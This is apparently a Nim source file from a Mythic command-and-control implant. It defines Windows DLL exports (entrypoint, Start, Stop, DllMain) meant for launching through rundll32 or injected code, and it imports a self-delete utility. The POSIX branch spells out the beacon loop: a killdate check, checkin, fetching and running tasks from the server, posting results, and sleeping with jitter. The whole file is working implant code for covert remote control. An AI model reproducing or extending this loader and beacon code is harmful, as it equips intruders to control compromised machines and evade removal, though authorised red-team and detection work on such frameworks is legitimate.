## DLL entry points for Windows
## This file provides DllMain and exported functions for DLL usage

import std/[times, random]
import config, agent

when defined(windows):
  import winim/lean
  import utils/self_delete
  
  # Import NimMain to initialize Nim runtime
  proc NimMain() {.cdecl, importc.}
  
  # Thread handle for background agent execution
  var agentThread: HANDLE = 0
  
  proc agentMain(param: pointer): DWORD {.stdcall.} =
    ## Background thread that runs the agent
    try:
      # Call the shared agent main loop
      runAgent()
      return 0
    except:
      return 1
  
  proc entrypoint(): BOOL {.exportc, dynlib, stdcall.} =
    ## Main exported entrypoint for the DLL
    ## This can be called via rundll32 or from injected code
    ## Runs agent directly (blocking) - rundll32 will wait for completion
    try:
      runAgent()
      return TRUE
    except:
      return FALSE
  
  proc Start(): BOOL {.exportc, dynlib, stdcall.} =
    ## Alias for entrypoint
    return entrypoint()
  
  proc Stop(): BOOL {.exportc, dynlib, stdcall.} =
    ## Exported function to stop the agent thread
    if agentThread != 0:
      discard TerminateThread(agentThread, 0)
      discard CloseHandle(agentThread)
      agentThread = 0
      return TRUE
    return FALSE
  
  proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.exportc, stdcall, dynlib.} =
    ## Standard DLL entry point
    ## Does minimal initialization only - call entrypoint() to start the agent
    case fdwReason
    of DLL_PROCESS_ATTACH:
      # Initialize Nim runtime once when DLL loads
      NimMain()
      # Disable thread library calls for this DLL
      discard DisableThreadLibraryCalls(hinstDLL)
      return TRUE
    of DLL_PROCESS_DETACH:
      # Stop agent thread on unload if it's running
      if agentThread != 0:
        discard TerminateThread(agentThread, 0)
        discard CloseHandle(agentThread)
        agentThread = 0
      return TRUE
    of DLL_THREAD_ATTACH, DLL_THREAD_DETACH:
      return TRUE
    else:
      return TRUE

else:
  # Non-Windows platforms (Linux/MacOS) use .so shared libraries
  when defined(posix):
    proc entrypoint(): bool {.exportc, dynlib.} =
      ## Main exported entrypoint for the shared library
      try:
        # Initialize random number generator for jitter
        randomize()
        
        # Check killdate
        let cfg = getConfig()
        let now = now().format("yyyy-MM-dd")
        if now >= cfg.killdate:
          return false
        
        # Initialize agent
        var agentInstance = newAgent()
        
        # Perform initial checkin
        if not agentInstance.checkin():
          return false
        
        # Main agent loop
        while not agentInstance.shouldExit:
          # Get tasking from Mythic
          let tasks = agentInstance.getTasks()
          
          # Process tasks
          agentInstance.processTasks(tasks)
          
          # Send responses back (handles background task state machine)
          agentInstance.postResponses()
          
          # Sleep with jitter
          agentInstance.sleep()
        
        return true
      except:
        return false
    
    proc Start(): bool {.exportc, dynlib.} =
      ## Alias for entrypoint
      return entrypoint()
